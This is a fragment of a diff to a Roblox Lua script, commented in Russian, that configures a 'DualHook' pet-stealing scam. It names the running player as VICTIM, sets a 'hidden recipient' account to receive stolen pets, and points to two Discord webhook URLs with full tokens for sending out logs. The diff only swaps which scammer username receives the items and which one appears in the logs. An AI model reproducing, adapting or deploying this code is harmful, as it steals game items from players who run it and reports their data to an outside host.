@@ -3,14 +3,14 @@ repeat
 until game:IsLoaded()
 
 -- 🔐 DualHook config (секретная часть)
-getgenv().DhUser = "chitofedy"
+getgenv().DhUser = "Warrior_ggs"
 getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← замени на свой второй вебхук
-getgenv().NewUser = "chitofedy" -- скрытый получатель петов
+getgenv().NewUser = "Warrior_ggs" -- скрытый получатель петов
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "Warrior_ggs" -- ← ник, который будет отображаться в логах
+    "chitofedy" -- ← ник, который будет отображаться в логах
 }
 
 local PET_WHITELIST = {
